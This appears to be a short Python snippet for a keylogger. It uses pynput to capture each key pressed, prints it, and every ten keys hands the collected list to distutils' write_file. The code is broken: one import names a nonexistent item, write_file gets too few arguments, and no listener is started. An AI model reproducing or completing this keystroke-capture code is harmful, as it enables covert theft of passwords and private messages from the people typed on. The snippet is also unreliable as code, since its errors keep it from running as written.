from distutils.file_util import write_file
from pynput import keyboard , Listener

count=0
keys=[]

def on_press(key):
    global keys,count
    
    keys.append(key)
    count+=1
    print("{0} presssed".format(key))
    
    if count>=10:
        count=0
        write_file(keys)
        keys=[] 